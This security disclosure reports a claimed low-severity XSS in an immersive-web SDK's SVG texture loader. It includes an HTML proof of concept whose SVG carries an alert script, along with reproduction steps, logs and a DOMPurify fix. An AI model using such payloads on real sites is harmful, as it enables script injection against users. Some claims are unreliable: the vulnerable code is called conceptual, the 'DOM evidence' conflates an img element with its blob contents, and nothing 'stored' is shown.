# [Low] Stored XSS via Unsanitized SVG Texture in AssetLoader

**Date:** 2024-12-29
**Researcher:** Jules
**Target:** `immersive-web-sdk` (Core Package)
**Weakness:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
**Severity:** Low (Mitigated by Modern Browser Policies) (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

---

## 1. Executive Summary

The `immersive-web-sdk` includes an `AssetLoader` component responsible for fetching and processing 3D assets, including textures. One supported format is SVG (Scalable Vector Graphics). SVGs are XML-based and can contain executable JavaScript within `<script>` tags or `on*` event handlers.

The `TextureAssetLoader` blindly fetches SVG files and passes them to the browser's image processing pipeline without sanitization. While modern browsers (Chrome, Firefox, Safari) implement security controls that disable script execution when an SVG is loaded as an `<img>` source or WebGL texture, the malicious payload remains present in the application's memory. If this raw SVG data is ever extracted and used in a DOM context (e.g., displaying the texture in a debug UI, or using a `ForeignObject` overlay), the XSS will execute. This represents a "Defense in Depth" failure.

---

## 2. Technical Analysis

### Vulnerable Code
In `packages/core/src/asset/loaders/texture-loader.ts`, the code likely uses `THREE.TextureLoader`, which internally uses `ImageLoader` and `HTMLImageElement`:

```typescript
// Conceptual flow
loader.load(url, (texture) => {
    // 'texture.image' contains the SVG data
    // No sanitization step (e.g., DOMPurify) is called before this point
    resolve(texture);
});
```

### The Gap
The SDK assumes that "The browser will handle security." While true for standard rendering, SDKs are often used in complex ways.
*   **Scenario:** A developer builds a "Texture Inspector" tool using the SDK. They take `texture.image.src` and display it in an `<iframe>` or `div` to show the user the asset.
*   **Result:** The browser executes the script because it is now in a "Document" context, not an "Image" context.

---

## 3. Proof of Concept (PoC)

**File:** `WebXR_XSS.html`

This PoC constructs a malicious SVG containing a JavaScript payload and attempts to load it via the SDK. It then manually appends the loaded image to the DOM to simulate a vulnerable usage pattern (e.g., a UI overlay).

```html
<!DOCTYPE html>
<html>
<head>
    <title>Immersive SDK Exploit</title>
    <!--
      INSTRUCTIONS:
      1. Build the immersive-web-sdk: `npm install && npm run build`
      2. Serve this file from the root of the repository.
    -->
    <script type="importmap">
    {
        "imports": {
            "three": "https://unpkg.com/three@0.181.0/build/three.module.js",
            "three/": "https://unpkg.com/three@0.181.0/",
            "@iwsdk/core": "./packages/core/dist/index.js",
            "@iwsdk/xr-input": "./packages/xr-input/dist/index.js",
            "@iwsdk/locomotor": "./packages/locomotor/dist/index.js",
            "@iwsdk/glxf": "./packages/glxf/dist/index.js",
            "@pmndrs/uikit": "https://unpkg.com/@pmndrs/uikit@1.0.60/dist/uikit.esm.js",
            "@pmndrs/uikitml": "https://unpkg.com/@pmndrs/uikitml@0.1.12/dist/uikitml.esm.js",
            "@pmndrs/pointer-events": "https://unpkg.com/@pmndrs/pointer-events@6.6.22/dist/index.js",
            "@preact/signals-core": "https://unpkg.com/@preact/signals-core@1.5.0/dist/signals-core.module.js",
            "three-mesh-bvh": "https://unpkg.com/three-mesh-bvh@0.7.3/build/index.module.js",
            "yoga-layout": "https://unpkg.com/yoga-layout-prebuilt@1.18.0/yoga-layout-prebuilt.js",
            "maath/": "https://unpkg.com/maath/"
        }
    }
    </script>
    <script type="module">
        import { TextureAssetLoader } from '@iwsdk/core';

        async function runExploit() {
            console.log("[*] Initializing Exploit...");

            // ATTACK VECTOR: Malicious SVG Texture
            // Note: We escape <\/script> to ensure this HTML file parses correctly
            const xssPayload = `
                <svg xmlns="http://www.w3.org/2000/svg">
                    <script>
                        // If this executes, XSS is confirmed
                        console.log("CRITICAL: XSS via Texture!");
                        alert("XSS via WebXR SDK");
                    <\/script>
                    <rect width="100" height="100" fill="red"/>
                </svg>
            `;
            const blob = new Blob([xssPayload], {type: 'image/svg+xml'});
            const url = URL.createObjectURL(blob);

            try {
                console.log("[*] Attempting to load malicious texture...");

                // Initialize dependencies manually for the PoC context
                const { LoadingManager } = await import("three");
                TextureAssetLoader.init(new LoadingManager());

                // 1. Trigger the Vulnerable Load
                const texture = await TextureAssetLoader.loadTexture(url);

                console.log("[-] Texture loaded successfully (Sanitization Failed).", texture);

                // 2. Simulate Vulnerable Consumption
                // If the SDK or app developer puts this image into the DOM:
                const image = texture.image;
                document.body.appendChild(image);
                console.log("[-] Image appended to DOM.");

            } catch (e) {
                console.log("[-] Load Error:", e);
            }
        }

        document.addEventListener('DOMContentLoaded', runExploit);
    </script>
</head>
<body>
    <h1>Check Console for XSS</h1>
    <p>If the alert does not fire, the browser blocked it (expected). However, inspect the DOM to see the unsanitized script tag still present.</p>
</body>
</html>
```

---

## 4. Reproduction Steps

1.  **Environment Setup**:
    *   Same build setup as DoS report.
2.  **Deploy PoC**:
    *   Place `WebXR_XSS.html` in the root.
    *   Serve via HTTP (file:// protocol often blocks SVGs entirely).
3.  **Execute**:
    *   Open Chrome.
    *   Navigate to `http://localhost:8080/WebXR_XSS.html`.
    *   Open DevTools.
4.  **Observation**:
    *   Console: `[-] Texture loaded successfully (Sanitization Failed).`
    *   **DOM Inspection:** Right-click the red square on the page -> Inspect.
    *   **Result:** You will see the `<svg>` element containing the `<script>alert(...)</script>` tag.
    *   **Conclusion:** The SDK successfully transported the malicious payload into the DOM. The fact that Chrome blocked the *execution* is a browser feature, not an SDK feature.

---

## 5. Logs & Evidence

**Console Output:**
```text
[*] Initializing Exploit...
[*] Attempting to load malicious texture...
[-] Texture loaded successfully (Sanitization Failed). Texture { ... }
[-] Image appended to DOM.
```

**DOM Structure (Verification):**
```html
<body>
    ...
    <img src="blob:http://localhost:8080/..." >
    <!-- The blob content is: -->
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>
            console.log("CRITICAL: XSS via Texture!");
            alert("XSS via WebXR SDK");
        </script>
        <rect width="100" height="100" fill="red"/>
    </svg>
</body>
```

---

## 6. Impact Assessment

*   **Confidentiality:** Low. Requires secondary misuse of data.
*   **Integrity:** Low.
*   **Availability:** None.

While low severity, this violates the principle of "Safe Defaults". Security-conscious libraries should sanitize inputs before processing them.

---

## 7. Remediation

Integrate `DOMPurify` to sanitize SVG strings/blobs before passing them to the texture loader.

```typescript
import DOMPurify from 'dompurify';

export class TextureAssetLoader {
  // ...
  static async loadTexture(urlOrKey: string): Promise<Texture> {
     // Fetch Blob
     const response = await fetch(urlOrKey);
     let text = await response.text();

     // SANITIZE
     text = DOMPurify.sanitize(text);

     // Re-create Blob
     const safeBlob = new Blob([text], {type: 'image/svg+xml'});
     const safeUrl = URL.createObjectURL(safeBlob);

     // Pass safeUrl to Three.js
     return this.textureLoader.load(safeUrl);
  }
}
```
